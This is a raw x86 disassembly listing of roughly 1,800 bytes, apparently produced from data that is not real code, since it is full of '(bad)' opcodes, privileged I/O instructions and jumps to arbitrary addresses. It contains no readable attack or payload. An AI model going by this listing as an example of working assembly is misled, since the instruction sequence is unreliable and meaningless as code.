  40e367:	ficomp WORD PTR [ecx]
  40e369:	mov    dh,BYTE PTR [esi+0x11]
  40e36c:	rcl    DWORD PTR [esi],0xfc
  40e36f:	push   0xffffff84
  40e371:	adc    al,0x4b
  40e373:	add    ecx,ebx
  40e375:	xchg   ecx,eax
  40e376:	pusha  
  40e377:	sub    dl,bh
  40e379:	jnp    0x40e32b
  40e37b:	mov    esp,0x4fa556ab
  40e380:	mov    ds:0x8ba5212a,al
  40e385:	js     0x40e3f7
  40e387:	mov    ebx,0x110a0eb0
  40e38c:	xchg   ecx,eax
  40e38d:	pop    esp
  40e38e:	js     0x40e38d
  40e390:	fisttp QWORD PTR [esi-0x34]
  40e393:	lock cmp BYTE PTR ds:0xb06173b0,bh
  40e39a:	(bad)  
  40e39b:	mov    ah,0x5a
  40e39d:	mov    edx,0xdbcd83a
  40e3a2:	pop    edi
  40e3a3:	sbb    bh,ch
  40e3a5:	dec    esi
  40e3a6:	dec    eax
  40e3a7:	xor    ebx,DWORD PTR [ecx+0x26f6dcb9]
  40e3ad:	and    dh,BYTE PTR [esp+ebx*8]
  40e3b0:	add    ecx,esi
  40e3b2:	into   
  40e3b3:	in     al,0x61
  40e3b5:	xchg   ebx,eax
  40e3b6:	jg     0x40e3a4
  40e3b8:	imul   esp,DWORD PTR [ebx+0x11],0x18
  40e3bc:	mov    eax,0xce24f1e
  40e3c1:	pushf  
  40e3c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3c3:	icebp  
  40e3c4:	jo     0x40e43c
  40e3c6:	fld    QWORD PTR [esi-0x6c]
  40e3c9:	lds    ecx,FWORD PTR [ebx]
  40e3cb:	mov    BYTE PTR ds:0x846f8424,ah
  40e3d1:	ja     0x40e3bd
  40e3d3:	push   edx
  40e3d4:	in     eax,dx
  40e3d5:	push   ebx
  40e3d6:	cs out dx,eax
  40e3d8:	gs (bad) 
  40e3da:	test   eax,0x919878fd
  40e3df:	fs in  eax,dx
  40e3e1:	(bad)  
  40e3e2:	outs   dx,BYTE PTR ds:[esi]
  40e3e3:	push   0xffffff8b
  40e3e5:	xchg   edx,eax
  40e3e6:	adc    BYTE PTR [ecx-0x46],ah
  40e3e9:	out    0x82,eax
  40e3eb:	jge    0x40e41f
  40e3ed:	fwait
  40e3ee:	rcl    DWORD PTR [edi],1
  40e3f0:	pop    ss
  40e3f1:	push   esi
  40e3f2:	mov    esi,0x31b7dce1
  40e3f7:	mov    bh,0x9a
  40e3f9:	mov    al,ds:0xbe369e9d
  40e3fe:	mov    dl,0x4f
  40e400:	adc    al,0x49
  40e402:	inc    ebp
  40e403:	jns    0x40e428
  40e405:	add    eax,0x134e3252
  40e40a:	xor    dh,BYTE PTR [esi-0x374f121a]
  40e410:	mov    DWORD PTR [ecx],edx
  40e412:	retf   
  40e413:	or     ebp,DWORD PTR [edx+0x2]
  40e416:	sub    BYTE PTR [edx-0x39ead858],bh
  40e41c:	xor    ch,BYTE PTR [ecx+eax*8+0x6]
  40e420:	sti    
  40e421:	or     dl,BYTE PTR [esi+0x21]
  40e424:	xor    eax,0x66950a0a
  40e42a:	test   DWORD PTR [edx],ebx
  40e42c:	mov    edi,0xbfc1957
  40e431:	ds pop ecx
  40e433:	fdivr  DWORD PTR [edi+edx*1+0x82d9e58]
  40e43a:	out    dx,al
  40e43b:	lods   eax,DWORD PTR ds:[esi]
  40e43c:	repz sub BYTE PTR [edi],dl
  40e43f:	or     BYTE PTR [esi+0x26],al
  40e442:	dec    ecx
  40e443:	or     eax,0x857796c6
  40e448:	push   esp
  40e449:	lds    edx,FWORD PTR [ebp+0x1e]
  40e44c:	ror    DWORD PTR [ecx],1
  40e44e:	ret    0xe8aa
  40e451:	fwait
  40e452:	jnp    0x40e3e0
  40e454:	sbb    BYTE PTR [ebp+0x73],0x53
  40e458:	rcr    cl,cl
  40e45a:	push   esi
  40e45b:	shl    BYTE PTR [edi+ecx*1],0xaf
  40e45f:	outs   dx,BYTE PTR ds:[esi]
  40e460:	into   
  40e461:	inc    esp
  40e462:	stos   DWORD PTR es:[edi],eax
  40e463:	dec    esi
  40e464:	fisttp DWORD PTR [edi-0x63318e5d]
  40e46a:	mov    edi,0x2bf683d1
  40e46f:	lahf   
  40e470:	lds    ebp,FWORD PTR [ebp+0x7b4db02c]
  40e476:	sbb    al,0x54
  40e478:	lahf   
  40e479:	push   edi
  40e47a:	pop    eax
  40e47b:	in     eax,dx
  40e47c:	(bad)  
  40e47e:	into   
  40e47f:	push   0xffffffaf
  40e481:	xchg   ebp,eax
  40e482:	mov    ebx,0x9c6c1ec5
  40e487:	pop    es
  40e488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e489:	fimul  WORD PTR [edi-0x25]
  40e48c:	pop    ds
  40e48d:	and    BYTE PTR [edx+edx*1],ah
  40e490:	rol    ecx,cl
  40e492:	jp     0x40e419
  40e494:	leave  
  40e495:	ins    DWORD PTR es:[edi],dx
  40e496:	jmp    0xf3499f9a
  40e49b:	inc    eax
  40e49c:	mov    DWORD PTR [ebp+0x2aee3fd0],esp
  40e4a2:	jp     0x40e4e4
  40e4a4:	ins    BYTE PTR es:[edi],dx
  40e4a5:	dec    esi
  40e4a6:	and    al,0xb9
  40e4a8:	xchg   edx,eax
  40e4a9:	xlat   BYTE PTR ds:[ebx]
  40e4aa:	mov    dl,0xdb
  40e4ac:	cld    
  40e4ad:	push   edi
  40e4ae:	das    
  40e4af:	jmp    0xb45c0202
  40e4b4:	xchg   edi,eax
  40e4b5:	jbe    0x40e48c
  40e4b7:	pop    ecx
  40e4b8:	mov    edx,0xf9f8c7c6
  40e4bd:	jno    0x40e533
  40e4bf:	les    ebp,FWORD PTR [ebp+0x671eb459]
  40e4c5:	push   ecx
  40e4c6:	dec    edi
  40e4c7:	(bad)  
  40e4c8:	fcmovne st,st(6)
  40e4ca:	aad    0xf2
  40e4cc:	aas    
  40e4cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e4ce:	or     ebp,esi
  40e4d0:	adc    edi,ebx
  40e4d2:	call   0xd63d:0xf0b166d1
  40e4d9:	addr16 add cl,0xac
  40e4dd:	fstp   QWORD PTR [eax+esi*4-0x6c]
  40e4e1:	cmp    al,0x7d
  40e4e3:	jbe    0x40e4d1
  40e4e5:	push   cs
  40e4e6:	sub    ecx,esp
  40e4e8:	xor    BYTE PTR [esi-0xf],al
  40e4eb:	std    
  40e4ec:	mov    ebp,0x2e734ba2
  40e4f1:	(bad)  
  40e4f2:	jecxz  0x40e553
  40e4f4:	jnp    0x40e4c9
  40e4f6:	sub    DWORD PTR [esi+0x56],eax
  40e4f9:	pop    ecx
  40e4fa:	lahf   
  40e4fb:	push   edi
  40e4fc:	sbb    al,0x17
  40e4fe:	inc    esp
  40e4ff:	xor    esi,edx
  40e501:	test   eax,0xfa22836f
  40e506:	or     eax,0x7feb41b0
  40e50b:	ins    DWORD PTR es:[edi],dx
  40e50c:	leave  
  40e50d:	pop    esi
  40e50e:	call   0xfd64:0x90fe0ef2
  40e515:	daa    
  40e516:	fmul   DWORD PTR [eax-0x40]
  40e519:	mov    cl,0xc8
  40e51b:	gs ja  0x40e520
  40e51e:	call   0xae8b005b
  40e523:	aam    0x67
  40e525:	add    dl,BYTE PTR [ebp+0x6f]
  40e528:	push   ebx
  40e529:	jb     0x40e513
  40e52b:	jo     0x40e597
  40e52d:	jae    0x40e5a1
  40e52f:	jb     0x40e56d
  40e531:	ins    BYTE PTR es:[edi],dx
  40e532:	sbb    BYTE PTR [esi+0x6ab3d5cd],al
  40e538:	dec    ebp
  40e539:	push   ebp
  40e53a:	loope  0x40e58d
  40e53c:	das    
  40e53d:	dec    edi
  40e53e:	push   ecx
  40e53f:	lods   al,BYTE PTR ds:[esi]
  40e540:	ins    DWORD PTR es:[edi],dx
  40e541:	push   ebp
  40e542:	je     0x40e5a1
  40e544:	fcomp  QWORD PTR [edx+0x1572e74b]
  40e54a:	out    dx,eax
  40e54b:	mov    BYTE PTR [eax+0x2eb0cde4],ch
  40e551:	or     dh,BYTE PTR [esi+eiz*4]
  40e554:	sub    eax,ebx
  40e556:	sbb    al,0x4c
  40e558:	adc    eax,0x85571ce2
  40e55d:	xchg   DWORD PTR [ecx+eax*4],edi
  40e560:	(bad)  
  40e561:	xchg   ebp,eax
  40e562:	or     DWORD PTR [edx-0x11cb5a80],esp
  40e568:	fidiv  DWORD PTR ds:0x2b6e5763
  40e56e:	push   ss
  40e56f:	sbb    ebx,ecx
  40e571:	xor    BYTE PTR [eax+0x75446feb],ch
  40e577:	sub    edi,DWORD PTR [eax-0x39]
  40e57a:	hlt    
  40e57b:	push   0xffffffa3
  40e57d:	dec    ebx
  40e57e:	jge    0x40e5a5
  40e580:	aad    0xbd
  40e582:	repnz ficomp WORD PTR [edi]
  40e585:	lods   eax,DWORD PTR ds:[esi]
  40e586:	mov    ah,0x3a
  40e588:	pop    esi
  40e589:	out    dx,al
  40e58a:	adc    al,0x55
  40e58c:	mov    esp,0xa56595d8
  40e591:	in     al,0xaf
  40e593:	dec    edi
  40e594:	push   ds
  40e595:	lods   al,BYTE PTR ds:[esi]
  40e596:	push   edx
  40e597:	xchg   ecx,eax
  40e598:	sbb    BYTE PTR [edi-0x3686d42f],dl
  40e59e:	jo     0x40e5ae
  40e5a0:	and    eax,0x27f560f4
  40e5a5:	jmp    0x40e533
  40e5a7:	sub    DWORD PTR [edx],ebx
  40e5a9:	xlat   BYTE PTR ds:[ebx]
  40e5aa:	outs   dx,DWORD PTR ds:[esi]
  40e5ab:	and    DWORD PTR [ebx+ebx*1],edx
  40e5ae:	mov    ds:0xa531af5a,eax
  40e5b3:	repz iret 
  40e5b5:	je     0x40e57c
  40e5b7:	jbe    0x40e575
  40e5b9:	fdivrp st(2),st
  40e5bb:	cmp    BYTE PTR [eax],0x7
  40e5be:	push   ds
  40e5bf:	jbe    0x40e636
  40e5c1:	pop    ds
  40e5c2:	jns    0x40e5e4
  40e5c4:	in     al,0x8d
  40e5c6:	cwde   
  40e5c7:	stos   DWORD PTR es:[edi],eax
  40e5c8:	lds    eax,FWORD PTR [edi+0x14]
  40e5cb:	dec    esp
  40e5cc:	push   cs
  40e5cd:	aad    0x95
  40e5cf:	mov    edi,0x18d6e592
  40e5d4:	rcl    BYTE PTR [eax-0x787919b],1
  40e5da:	cld    
  40e5db:	dec    ebp
  40e5dc:	dec    ebx
  40e5dd:	xor    esp,DWORD PTR [edx]
  40e5df:	inc    edx
  40e5e0:	or     eax,0xa54cf2b1
  40e5e5:	out    dx,al
  40e5e6:	xor    al,0xea
  40e5e8:	inc    eax
  40e5e9:	scas   eax,DWORD PTR es:[edi]
  40e5ea:	lds    ecx,FWORD PTR [ebx-0x4c]
  40e5ed:	pop    esi
  40e5ee:	mov    ch,0xb7
  40e5f0:	dec    ecx
  40e5f1:	icebp  
  40e5f2:	inc    edi
  40e5f3:	mov    ah,0x74
  40e5f5:	daa    
  40e5f6:	add    BYTE PTR [eax+0x2f],dh
  40e5f9:	pop    esi
  40e5fa:	sub    eax,0x3a5634b4
  40e5ff:	fcomp  QWORD PTR [ebx+0x84726f0]
  40e605:	push   cs
  40e606:	fchs   
  40e608:	mov    eax,DWORD PTR [eax+0xe039679]
  40e60e:	push   DWORD PTR [ebx-0x5f43ecb6]
  40e614:	mov    eax,0xb7a20d62
  40e619:	jmp    0x7be1a42d
  40e61e:	in     al,0x9a
  40e620:	fisttp QWORD PTR [eax+0x3e]
  40e623:	call   0x3282:0x105e105
  40e62a:	not    ecx
  40e62c:	and    BYTE PTR [edx+edx*4+0x52043a70],dl
  40e633:	aam    0xfe
  40e635:	fisubr DWORD PTR [esi+0x7c]
  40e638:	mov    ds:0xc38ed976,eax
  40e63d:	push   cs
  40e63e:	pushf  
  40e63f:	mov    dh,0xbb
  40e641:	push   ebp
  40e642:	data16 js 0x40e646
  40e645:	jo     0x40e60b
  40e647:	mov    gs,ebp
  40e649:	cmp    al,BYTE PTR [eax+edi*8]
  40e64c:	inc    esi
  40e64d:	add    dh,ah
  40e64f:	ret    0x1ce1
  40e652:	cli    
  40e653:	and    BYTE PTR [ebx+0x581748ad],0x75
  40e65a:	jmp    0xe5e12892
  40e65f:	cmp    DWORD PTR [ecx-0x12],esi
  40e662:	mov    bl,0xcb
  40e664:	fsubr  QWORD PTR [edi]
  40e666:	pop    edx
  40e667:	leave  
  40e668:	addr16 dec esp
  40e66a:	pop    ds
  40e66b:	dec    ebp
  40e66c:	ret    
  40e66d:	clc    
  40e66e:	rcr    BYTE PTR [esi],cl
  40e670:	arpl   WORD PTR [edx-0x59],ax
  40e673:	pushf  
  40e674:	pop    eax
  40e675:	jbe    0x40e6de
  40e677:	lock adc al,0x55
  40e67a:	call   0xeca9:0x958e10d2
  40e681:	xchg   ebp,eax
  40e682:	add    DWORD PTR [ebx-0x1d],0xffffffe4
  40e686:	xchg   BYTE PTR ds:0xd3274b57,ch
  40e68c:	mov    ah,dl
  40e68e:	pop    ss
  40e68f:	out    0x39,al
  40e691:	scas   eax,DWORD PTR es:[edi]
  40e692:	jno    0x40e665
  40e694:	inc    edx
  40e695:	(bad)  
  40e697:	mov    eax,0xd5d15390
  40e69c:	leave  
  40e69d:	dec    esi
  40e69e:	mul    cl
  40e6a0:	xor    DWORD PTR [esi+0x16],edi
  40e6a3:	js     0x40e68e
  40e6a5:	(bad)  
  40e6a6:	mov    eax,0x592c9bc1
  40e6ab:	adc    al,0xe
  40e6ad:	mov    ebp,0xe521e04c
  40e6b2:	sbb    bl,BYTE PTR [edx-0xf]
  40e6b5:	call   0x5218:0x35fcc2d7
  40e6bc:	dec    edi
  40e6bd:	retf   0xa63b
  40e6c0:	inc    esi
  40e6c1:	inc    eax
  40e6c2:	ror    BYTE PTR [edi-0x23],1
  40e6c5:	mov    edi,0x77c5885a
  40e6ca:	rcl    eax,1
  40e6cc:	mov    ecx,0x82ba909f
  40e6d1:	(bad)  
  40e6d2:	mov    esi,0xb8bddfae
  40e6d7:	xchg   esp,eax
  40e6d8:	(bad)  
  40e6d9:	jp     0x40e714
  40e6db:	aaa    
  40e6dc:	sub    DWORD PTR [eax-0x6620ab34],ebp
  40e6e2:	cs adc edi,ecx
  40e6e5:	push   esi
  40e6e6:	ins    BYTE PTR es:[edi],dx
  40e6e7:	ins    BYTE PTR es:[edi],dx
  40e6e8:	jl     0x40e75d
  40e6ea:	in     al,dx
  40e6eb:	jge    0x40e67f
  40e6ed:	enter  0x12c3,0x73
  40e6f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6f2:	lds    ebx,FWORD PTR [edx]
  40e6f4:	pop    ecx
  40e6f5:	ret    
  40e6f6:	push   cs
  40e6f7:	or     edi,DWORD PTR [edx-0x2c1a6fbe]
  40e6fd:	mov    ds:0xa77a851a,eax
  40e702:	push   edx
  40e703:	xchg   DWORD PTR [eax],esi
  40e705:	inc    edx
  40e706:	ins    DWORD PTR es:[edi],dx
  40e707:	mov    esi,0xee4439f5
  40e70c:	xor    DWORD PTR [esi],eax
  40e70e:	add    eax,0xb24deeab
  40e713:	data16 jns 0x40e787
  40e716:	adc    edx,DWORD PTR [edx-0x34]
  40e719:	cli    
  40e71a:	push   0x49e1d65f
  40e71f:	cs pop ebx
  40e721:	or     cl,BYTE PTR [ecx+eax*4+0x1f]
  40e725:	sbb    BYTE PTR ds:0x6b71fe38,0xa
  40e72c:	test   DWORD PTR [ebx-0x45],edi
  40e72f:	std    
  40e730:	xchg   DWORD PTR [edx-0x6e6f41a0],esp
  40e736:	push   0x7e1b7eef
  40e73b:	and    al,0x66
  40e73d:	outs   dx,BYTE PTR ds:[esi]
  40e73e:	cs push es
  40e740:	or     DWORD PTR [esi+0x6267c32b],esp
  40e746:	aad    0x20
  40e748:	mov    eax,ds:0xaa8846b2
  40e74d:	or     BYTE PTR [eax],0xf
  40e750:	and    esp,DWORD PTR [eax]
  40e752:	xchg   DWORD PTR [eax*8-0x5f0933ce],edi
  40e759:	je     0x40e722
  40e75b:	fs ja  0x40e764
  40e75e:	sub    al,0x69
  40e760:	jl     0x40e732
  40e762:	dec    edx
  40e763:	mov    dh,0x20
  40e765:	nop
  40e766:	in     al,dx
  40e767:	scas   eax,DWORD PTR es:[edi]
  40e768:	sbb    DWORD PTR [eax+0x7d],ecx
  40e76b:	sbb    eax,0xf72d9edf
  40e770:	call   0xd1b9a13
  40e775:	xchg   esi,eax
  40e776:	jle    0x40e712
  40e778:	xor    al,BYTE PTR [ecx-0x2d]
  40e77b:	sub    BYTE PTR [ebx],ch
  40e77d:	cmp    dl,bh
  40e77f:	out    0x51,eax
  40e781:	ret    
  40e782:	out    0x5,al
  40e784:	out    dx,al
  40e785:	gs jbe 0x40e7c7
  40e788:	(bad)  
  40e789:	sub    esp,DWORD PTR [ebx]
  40e78b:	clc    
  40e78c:	enter  0x77e3,0xc1
  40e790:	icebp  
  40e791:	fnstsw WORD PTR [ebx]
  40e793:	sub    esi,0x1c
  40e796:	call   0xab9b0862
  40e79b:	es pop es
  40e79d:	mov    bl,0xf9
  40e79f:	movsx  ecx,BYTE PTR [ebx-0x410b4bee]
  40e7a6:	inc    eax
  40e7a7:	fdivr  QWORD PTR [eax-0x60]
  40e7aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ac:	inc    ecx
  40e7ad:	mov    eax,ds:0x3e3d9bf6
  40e7b2:	bound  ebp,QWORD PTR [edx-0x62f8c6bb]
  40e7b8:	pop    ds
  40e7b9:	not    bh
  40e7bb:	push   ecx
  40e7bc:	shr    DWORD PTR [eax+edx*4+0x5e1fb577],cl
  40e7c3:	inc    edx
  40e7c4:	into   
  40e7c5:	or     eax,0x1b095015
  40e7ca:	(bad)  
  40e7cb:	out    dx,al
  40e7cc:	mov    esi,0x579844bb
  40e7d1:	and    al,0x63
  40e7d3:	xchg   DWORD PTR [eax+0x30eadd8c],ebx
  40e7d9:	stos   BYTE PTR es:[edi],al
  40e7da:	cmp    eax,DWORD PTR [edx-0x2c]
  40e7dd:	jmp    0x40e7b1
  40e7df:	fs rcr ebp,cl
  40e7e2:	cmp    edi,ebp
  40e7e4:	or     DWORD PTR [ebx+0x220878c1],eax
  40e7ea:	sub    al,0x5a
  40e7ec:	cmp    eax,0x3b95d363
  40e7f1:	jp     0x40e825
  40e7f3:	loop   0x40e79b
  40e7f5:	mov    ah,0x45
  40e7f7:	add    eax,0x2e97af26
  40e7fd:	scas   eax,DWORD PTR es:[edi]
  40e7fe:	enter  0x7045,0x5e
  40e802:	repz loopne 0x40e7a2
  40e805:	shr    BYTE PTR [edx+0x19],0x62
  40e809:	xchg   edx,eax
  40e80a:	inc    ebx
  40e80b:	test   al,0xb2
  40e80d:	cmp    al,0x43
  40e80f:	cmp    ebp,eax
  40e811:	dec    ecx
  40e812:	out    0x85,eax
  40e814:	cs aam 0x7e
  40e817:	mov    dh,0x88
  40e819:	popf   
  40e81a:	jmp    0xefbf9f5c
  40e81f:	cmp    dl,BYTE PTR [ebp+eax*8+0x11]
  40e823:	(bad)  
  40e824:	aam    0x98
  40e826:	or     edi,DWORD PTR [edx]
  40e828:	in     al,0x9a
  40e82a:	dec    esi
  40e82b:	stos   DWORD PTR es:[edi],eax
  40e82c:	(bad)  
  40e82d:	push   ecx
  40e82e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e82f:	neg    DWORD PTR [ecx]
  40e831:	or     ah,ch
  40e833:	imul   eax,edi,0xc3923171
  40e839:	xchg   edi,eax
  40e83a:	xor    DWORD PTR [ebx-0x35e0e2a8],edi
  40e840:	sub    BYTE PTR [ecx],bh
  40e842:	(bad)  
  40e843:	or     eax,0x5f2cfa38
  40e848:	out    dx,eax
  40e849:	sbb    bh,BYTE PTR [eax-0x2a904bc7]
  40e84f:	loop   0x40e833
  40e851:	xor    eax,DWORD PTR [ebx+0x7a]
  40e854:	fsubr  QWORD PTR [ebx]
  40e856:	cmc    
  40e857:	je     0x40e8a5
  40e859:	jb     0x40e863
  40e85b:	imul   ecx,DWORD PTR [eax+0x76],0xffffffe9
  40e85f:	xlat   BYTE PTR ds:[ebx]
  40e860:	cld    
  40e861:	sbb    bl,BYTE PTR [eax]
  40e863:	scas   eax,DWORD PTR es:[edi]
  40e864:	xor    ebx,eax
  40e866:	idiv   DWORD PTR [ecx-0x40155109]
  40e86c:	xor    edi,DWORD PTR [esi+0x37]
  40e86f:	out    dx,eax
  40e870:	loop   0x40e82b
  40e872:	sahf   
  40e873:	jae    0x40e82b
  40e875:	pop    ebp
  40e876:	adc    eax,0x11e098aa
  40e87b:	iret   
  40e87c:	test   bh,ah
  40e87e:	jl     0x40e8af
  40e880:	xchg   ebp,ebp
  40e882:	mov    ecx,0xc4f4c452
  40e887:	push   ss
  40e888:	pop    esi
  40e889:	mov    ebx,0x919f5bb7
  40e88e:	fisttp DWORD PTR [esi+0x54]
  40e891:	in     al,0x9e
  40e893:	inc    edi
  40e894:	popa   
  40e895:	or     eax,0x7894b836
  40e89a:	sbb    bh,BYTE PTR [eax+ebx*8]
  40e89d:	jns    0x40e8ed
  40e89f:	cpuid  
  40e8a1:	jo     0x40e834
  40e8a3:	stos   DWORD PTR es:[edi],eax
  40e8a4:	ss inc ecx
  40e8a6:	outs   dx,BYTE PTR ds:[esi]
  40e8a7:	pusha  
  40e8a8:	out    dx,eax
  40e8a9:	dec    ebp
  40e8aa:	mov    al,ds:0x6f66106d
  40e8af:	retf   
  40e8b0:	dec    esp
  40e8b1:	xor    al,ah
  40e8b3:	jmp    0x66d2e981
  40e8b8:	dec    edi
  40e8b9:	je     0x40e85f
  40e8bb:	push   ss
  40e8bc:	int3   
  40e8bd:	inc    esi
  40e8be:	add    edi,DWORD PTR [esi-0x7f]
  40e8c1:	retf   0x869a
  40e8c4:	add    eax,0xfa85706e
  40e8c9:	call   0x7d0c9937
  40e8ce:	mov    edx,ecx
  40e8d0:	pop    edi
  40e8d1:	fist   WORD PTR ds:0x1e7f3191
  40e8d7:	imul   esp,DWORD PTR [esi+0x43e66d67],0xb94d133
  40e8e1:	scas   eax,DWORD PTR es:[edi]
  40e8e2:	xor    edi,edx
  40e8e4:	ficomp WORD PTR [edi-0x1f]
  40e8e7:	ret    
  40e8e8:	scas   eax,DWORD PTR es:[edi]
  40e8e9:	in     eax,0xaa
  40e8eb:	mov    dl,0x6d
  40e8ed:	loope  0x40e8ea
  40e8ef:	lock and BYTE PTR [ebx-0x3],ah
  40e8f3:	push   edx
  40e8f4:	std    
  40e8f5:	dec    edx
  40e8f6:	inc    eax
  40e8f7:	inc    eax
  40e8f8:	xchg   ebx,eax
  40e8f9:	shr    BYTE PTR [ecx+0x42],cl
  40e8fc:	jo     0x40e88a
  40e8fe:	mov    dl,0xb1
  40e900:	loop   0x40e890
  40e902:	(bad)  
  40e903:	in     eax,dx
  40e904:	in     al,dx
  40e905:	in     al,dx
  40e906:	xchg   esi,eax
  40e907:	mov    ebx,0xaa0b3ee6
  40e90c:	dec    edi
  40e90d:	mov    ds:0x3a8ce98a,eax
  40e912:	ins    DWORD PTR es:[edi],dx
  40e913:	ds sahf 
  40e915:	add    ah,BYTE PTR [edi+0x51]
  40e918:	mov    bh,0x19
  40e91a:	dec    esp
  40e91b:	sahf   
  40e91c:	loopne 0x40e8fb
  40e91e:	jmp    0xa47936d3
  40e923:	mov    esi,0x47748b28
  40e928:	daa    
  40e929:	clc    
  40e92a:	push   es
  40e92b:	daa    
  40e92c:	pop    edx
  40e92d:	lahf   
  40e92e:	xchg   edx,eax
  40e92f:	mov    edi,0xb0214939
  40e934:	adc    eax,0xc768aafa
  40e939:	cwde   
  40e93a:	push   edx
  40e93b:	mul    BYTE PTR [ebx+0x7f16ab70]
  40e941:	inc    ecx
  40e942:	sahf   
  40e943:	cmc    
  40e944:	pop    esi
  40e945:	or     al,0x10
  40e947:	and    eax,0x7aed84f9
  40e94c:	or     ah,BYTE PTR [esi]
  40e94e:	sbb    BYTE PTR [ebx-0x7b9e774a],ch
  40e954:	loop   0x40e977
  40e956:	ja     0x40e953
  40e958:	scas   al,BYTE PTR es:[edi]
  40e959:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e95a:	test   bh,ch
  40e95c:	fld    QWORD PTR [esi-0x47dedc5e]
  40e962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e963:	pusha  
  40e964:	fisubr DWORD PTR [ebp-0xc38168c]
  40e96a:	cmp    esp,DWORD PTR [eax]
  40e96c:	aas    
  40e96d:	mov    ebx,ds
  40e96f:	fidivr WORD PTR [ebx]
  40e971:	or     dl,bl
  40e973:	sahf   
  40e974:	xchg   edi,eax
  40e975:	mov    gs,WORD PTR [eax+ebx*2+0x51]
  40e979:	jne    0x40e9ee
  40e97b:	and    cl,0xe5
  40e97e:	inc    ebx
  40e97f:	inc    ebp
  40e980:	leave  
  40e981:	fsubr  QWORD PTR [ecx+edi*4-0x2093c886]
  40e988:	xor    al,0xb1
  40e98a:	jp     0x40ea05
  40e98c:	sbb    eax,0xe1d88a84
  40e991:	cmp    DWORD PTR gs:[ebx],eax
  40e994:	pop    edi
  40e995:	in     al,dx
  40e996:	call   0x473a8e1b
  40e99b:	inc    eax
  40e99c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e99d:	push   esp
  40e99e:	into   
  40e99f:	pop    ebp
  40e9a0:	ins    DWORD PTR es:[edi],dx
  40e9a1:	(bad)  
  40e9a2:	pop    ebp
  40e9a3:	mov    al,0x47
  40e9a5:	in     al,0xd0
  40e9a7:	mov    eax,0x3cf448f9
  40e9ac:	lahf   
  40e9ad:	or     al,0x54
  40e9af:	scas   al,BYTE PTR es:[edi]
  40e9b0:	add    DWORD PTR [edx-0x7c],edx
  40e9b3:	mov    ecx,0x2daeb816
  40e9b8:	pop    ecx
  40e9b9:	inc    esi
  40e9ba:	rol    cl,0xbc
  40e9bd:	(bad)  
  40e9be:	sub    DWORD PTR [eax+0x124f1f5f],esi
  40e9c4:	sub    DWORD PTR [eax-0x32],ebp
  40e9c7:	mov    ah,0x70
  40e9c9:	outs   dx,BYTE PTR ds:[esi]
  40e9ca:	add    edi,DWORD PTR [esi+0x4f]
  40e9cd:	imul   esp,DWORD PTR [ecx],0x7c
  40e9d0:	syscall 
  40e9d2:	mov    ebx,0xd64f1fde
  40e9d7:	nop
  40e9d8:	iret   
  40e9d9:	rcl    BYTE PTR [ebp-0x627567bf],0x28
  40e9e0:	sahf   
  40e9e1:	xor    edi,DWORD PTR [esi-0x7e]
  40e9e4:	cli    
  40e9e5:	or     BYTE PTR [eax+0x41],bl
  40e9e8:	or     eax,0xde377ad2
  40e9ed:	aaa    
  40e9ee:	aam    0xeb
  40e9f0:	adc    eax,0xb95883fb
  40e9f5:	mov    ebx,0xbf3dc920
  40e9fa:	shl    DWORD PTR [edi],cl
  40e9fc:	xchg   DWORD PTR [edx],ebp
  40e9fe:	imul   edi,eax,0x5c
  40ea01:	add    ebp,edx
  40ea03:	xor    edi,ecx
  40ea05:	inc    eax
  40ea06:	push   ebp
  40ea07:	inc    ebp
  40ea08:	and    al,0x0
  40ea0a:	jge    0x40e995
  40ea0c:	dec    esp
  40ea0d:	adc    BYTE PTR [ebp+0x69c07b11],bl
  40ea13:	mov    edi,0x997dc6b2
  40ea18:	sub    BYTE PTR [esi-0x72c1ecd9],0x3f
  40ea1f:	fwait
  40ea20:	inc    ebp
  40ea21:	jl     0x40e9e6
  40ea23:	jp     0x40ea9c
  40ea25:	stc    
  40ea26:	dec    ebp
  40ea27:	popf   
  40ea28:	mov    edi,0x8d1a2a01
  40ea2d:	fisubr WORD PTR [edi-0x6]
  40ea30:	pop    ss
  40ea31:	popa   
  40ea32:	ror    BYTE PTR [ebx+esi*8],cl
  40ea35:	xchg   DWORD PTR [edi],edx
  40ea37:	jae    0x40ea0f
  40ea39:	out    dx,al
  40ea3a:	pop    ebx
  40ea3b:	outs   dx,DWORD PTR ds:[esi]
  40ea3c:	and    esi,ebp
  40ea3e:	popf   
  40ea3f:	cli    
  40ea40:	or     ebx,ebx
  40ea42:	shl    esp,0x9a
  40ea45:	xchg   DWORD PTR [eax+eax*8-0x3a],edx
  40ea49:	mov    ds:0x8a6a3a2,eax
  40ea4e:	test   DWORD PTR [edx],edx
  40ea50:	sahf   
  40ea51:	xchg   edx,eax
  40ea52:	scas   eax,DWORD PTR es:[edi]
  40ea53:	stc    
  40ea54:	fwait
  40ea55:	jne    0x40eacd
  40ea57:	test   DWORD PTR [esi+ebp*2+0x58],edx
  40ea5b:	(bad)  
  40ea5d:	push   edi
  40ea5e:	xchg   ebp,eax
  40ea5f:	inc    esi
  40ea60:	add    DWORD PTR [ecx-0x2e],0xbf5e4e84
  40ea67:	loopne 0x40ea78
  40ea69:	int3   
  40ea6a:	mov    ebx,0xcebe85de
  40ea6f:	inc    edx
  40ea70:	repnz loopne 0x40ea39
  40ea73:	push   edx
  40ea74:	ffree  st(5)
  40ea76:	pop    eax
  40ea77:	adc    BYTE PTR [ebx-0x454e708b],ch
  40ea7d:	icebp  
  40ea7e:	pusha  
  40ea7f:	xchg   esp,eax
  40ea80:	vfmsub132pd xmm7,xmm7,XMMWORD PTR [esi]
  40ea85:	jp     0x40ea41
  40ea87:	fild   DWORD PTR ds:0x2ac8eaea
  40ea8d:	and    DWORD PTR [edx],0x1b7db1aa
  40ea93:	stos   BYTE PTR es:[edi],al
  40ea94:	xchg   DWORD PTR [ecx],esp
  40ea96:	mov    BYTE PTR [ecx],al
  40ea98:	adc    ecx,DWORD PTR [ebp+0x54]
